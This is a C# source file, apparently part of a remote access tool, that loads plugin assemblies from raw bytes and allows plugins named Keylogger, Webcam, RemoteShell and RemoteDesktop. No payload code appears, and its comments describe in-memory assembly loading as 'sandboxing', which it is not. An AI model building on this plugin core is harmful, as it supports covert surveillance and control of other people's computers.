using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

namespace Shared
{
    /// <summary>
    /// Secure plugin system with sandboxing and validation
    /// </summary>
    public interface IPlugin
    {
        string Name { get; }
        string Version { get; }
        void Execute(object[] parameters);
    }

    public static class PluginSystem
    {
        private static readonly Dictionary<string, byte[]> _pluginCache = new();
        private static readonly Dictionary<string, string> _pluginHashes = new();
        private static readonly HashSet<string> _allowedPlugins = new()
        {
            "RemoteDesktop",
            "FileManager",
            "ProcessManager",
            "RemoteShell",
            "Webcam",
            "Keylogger",
            "SystemInfo"
        };

        /// <summary>
        /// Register plugin with hash verification
        /// </summary>
        public static void RegisterPlugin(string name, byte[] assemblyData)
        {
            if (!_allowedPlugins.Contains(name))
                throw new SecurityException($"Plugin '{name}' is not in whitelist");

            // Calculate hash for integrity check
            var hash = CalculateHash(assemblyData);
            
            _pluginCache[name] = assemblyData;
            _pluginHashes[name] = hash;
        }

        /// <summary>
        /// Load plugin with security checks
        /// </summary>
        public static IPlugin LoadPlugin(string name, byte[] assemblyData = null)
        {
            if (!_allowedPlugins.Contains(name))
                throw new SecurityException($"Plugin '{name}' is not allowed");

            byte[] data;
            
            if (assemblyData != null)
            {
                // Verify hash if plugin was previously registered
                if (_pluginHashes.ContainsKey(name))
                {
                    var hash = CalculateHash(assemblyData);
                    if (hash != _pluginHashes[name])
                        throw new SecurityException("Plugin hash mismatch - possible tampering");
                }
                data = assemblyData;
            }
            else if (_pluginCache.ContainsKey(name))
            {
                data = _pluginCache[name];
            }
            else
            {
                throw new FileNotFoundException($"Plugin '{name}' not found");
            }

            try
            {
                // Load assembly in isolated context
                var assembly = Assembly.Load(data);
                
                // Find plugin type
                Type pluginType = null;
                foreach (var type in assembly.GetTypes())
                {
                    if (typeof(IPlugin).IsAssignableFrom(type) && !type.IsInterface)
                    {
                        pluginType = type;
                        break;
                    }
                }

                if (pluginType == null)
                    throw new InvalidOperationException("No IPlugin implementation found");

                // Create instance
                var plugin = (IPlugin)Activator.CreateInstance(pluginType);
                return plugin;
            }
            catch (Exception ex)
            {
                throw new InvalidOperationException($"Failed to load plugin '{name}': {ex.Message}", ex);
            }
        }

        /// <summary>
        /// Check if plugin is cached
        /// </summary>
        public static bool IsPluginCached(string name)
        {
            return _pluginCache.ContainsKey(name);
        }

        /// <summary>
        /// Get list of available plugins
        /// </summary>
        public static IEnumerable<string> GetAvailablePlugins()
        {
            return _allowedPlugins;
        }

        /// <summary>
        /// Clear plugin cache
        /// </summary>
        public static void ClearCache()
        {
            _pluginCache.Clear();
            _pluginHashes.Clear();
        }

        private static string CalculateHash(byte[] data)
        {
            using var sha256 = SHA256.Create();
            var hash = sha256.ComputeHash(data);
            return Convert.ToBase64String(hash);
        }
    }

    public class SecurityException : Exception
    {
        public SecurityException(string message) : base(message) { }
    }
}
